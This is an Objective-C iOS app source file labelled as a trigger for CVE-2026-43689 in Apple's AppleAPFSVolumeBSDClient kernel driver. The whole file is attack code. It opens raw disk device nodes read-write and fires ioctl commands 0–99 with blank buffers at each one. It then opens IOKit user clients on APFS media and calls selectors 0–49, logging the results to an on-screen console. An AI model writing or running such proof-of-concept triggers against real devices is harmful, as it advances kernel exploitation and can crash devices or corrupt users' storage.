#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <sys/utsname.h>
#import <sys/stat.h>
#import <sys/ioctl.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== CVE-2026-43689 Trigger v2 ==="];
    [self log:@"Target: AppleAPFSVolumeBSDClient via device nodes"];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self triggerViaDeviceNodes];
    });
    
    return YES;
}

- (void)triggerViaDeviceNodes {
    [self log:@"\n[1] Probing APFS device nodes..."];
    
    // Try to access APFS volume device nodes
    const char *devices[] = {
        "/dev/disk0s1",
        "/dev/disk0s2",
        "/dev/disk1s1",
        "/dev/disk1s2",
        "/dev/disk2s1",
        "/dev/disk2s2",
        "/dev/disk3s1",
        "/dev/disk3s2",
        NULL
    };
    
    for (int i = 0; devices[i]; i++) {
        [self log:[NSString stringWithFormat:@"[2] Trying %s...", devices[i]]];
        
        int fd = open(devices[i], O_RDWR);
        if (fd >= 0) {
            [self log:[NSString stringWithFormat:@"[3] OPENED %s (fd=%d)", devices[i], fd]];
            
            // Try to trigger ioctl calls that might hit AppleAPFSVolumeBSDClient
            for (unsigned long cmd = 0; cmd < 100; cmd++) {
                char buf[4096] = {0};
                int result = ioctl(fd, cmd, buf);
                if (result != -1) {
                    [self log:[NSString stringWithFormat:@"[4] ioctl %lu: SUCCESS (result=%d)", cmd, result]];
                }
            }
            
            close(fd);
        } else {
            [self log:[NSString stringWithFormat:@"[3] Failed to open %s: %s", devices[i], strerror(errno)]];
        }
    }
    
    // Also try via IOKit registry
    [self log:@"\n[5] Probing IOKit registry for APFS..."];
    
    io_iterator_t iterator;
    kern_return_t kr = IOServiceGetMatchingServices(0, IOServiceMatching("IOMedia"), &iterator);
    if (kr == KERN_SUCCESS) {
        io_service_t service;
        int count = 0;
        while ((service = IOIteratorNext(iterator)) != 0) {
            count++;
            
            CFMutableDictionaryRef props;
            if (IORegistryEntryCreateCFProperties(service, &props, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
                NSDictionary *dict = (__bridge NSDictionary *)props;
                NSString *bsdName = dict[@"BSD Name"];
                NSString *content = dict[@"Content"];
                
                if (bsdName && [content containsString:@"Apple_APFS"]) {
                    [self log:[NSString stringWithFormat:@"[6] Found APFS media: %@ (%@)", bsdName, content]];
                    
                    io_connect_t conn;
                    kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
                    if (kr == KERN_SUCCESS) {
                        [self log:[NSString stringWithFormat:@"[7] Opened %@: 0x%x", bsdName, conn]];
                        
                        for (int sel = 0; sel < 50; sel++) {
                            uint64_t input[10] = {0};
                            uint64_t output[10] = {0};
                            uint32_t outputCnt = 10;
                            
                            kr = IOConnectCallMethod(conn, sel, input, 10, NULL, 0, output, &outputCnt, NULL, NULL);
                            if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
                                [self log:[NSString stringWithFormat:@"[8] %@ selector %d: 0x%x", bsdName, sel, kr]];
                            }
                        }
                        
                        IOServiceClose(conn);
                    }
                }
                
                CFRelease(props);
            }
            
            IOObjectRelease(service);
            if (count > 20) break;
        }
        IOObjectRelease(iterator);
    }
    
    [self log:@"\n=== Trigger Complete ==="];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
